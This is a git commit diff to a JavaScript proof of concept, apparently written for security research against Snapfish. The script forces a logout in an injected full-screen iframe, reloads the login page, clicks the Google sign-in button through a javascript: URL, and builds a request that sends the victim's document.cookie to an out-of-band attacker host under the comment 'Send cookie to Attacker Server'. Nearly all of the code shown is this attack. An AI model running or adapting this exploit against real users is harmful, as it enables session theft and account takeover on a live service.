b2cd8af5c0cf32d51d9df605cf2d4558b218cb55
Khara-h1 <117389489+Khara-h1@users.noreply.github.com>
2024-01-13 18:33:44 +0100

    Update snapfish4.js

--- poc/shutterfly/snapfish4.js
+++ poc/shutterfly/snapfish4.js
@@ -4,7 +4,7 @@ var profileIframe2 = document.createElement('iframe');
 profileIframe2.setAttribute('src', 'https://www.snapfish.com/logout');
 profileIframe2.setAttribute('width', '100%');
 profileIframe2.setAttribute('height', '500px');
-profileIframe2.setAttribute('style', 'position:absolute;z-index:999;top: 100px;');
+profileIframe2.setAttribute('style', 'position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;');
 
 document.body.appendChild(profileIframe2);
 
@@ -12,11 +12,9 @@ document.body.appendChild(profileIframe2);
 //profileIframe2.setAttribute('src', 'https://www.snapfish.com/v1/gw/snapfish/oauth/google/signin?TNCFlag=1&context=/hp/sf/sf-us/snapfish-us&sourceGroup=sf-store&code=527231285582946&next=https%3A%2F%2Fwww.snapfish.com%2Fhome&SubscriptionFlag=ALL');
 setTimeout(() => {
   profileIframe2.setAttribute('src', "https://www.snapfish.com/loginto");
-}, 3000)
+}, 10000)
 
-setTimeout(() => {profileIframe2.setAttribute('src', 'javascript:document.getElementById("googleSignInButton").click();');}, 6000)
-
-alert("LOGIN GOOGLE");
+setTimeout(() => {profileIframe2.setAttribute('src', 'javascript:document.getElementById("googleSignInButton").click();');}, 20000)
 
 //Send cookie to Attacker Server
 var link="https://dmftkmghscwxjulluncuqmho9x6l6ujkt.oast.fun/VictimCookies="+document.cookie;
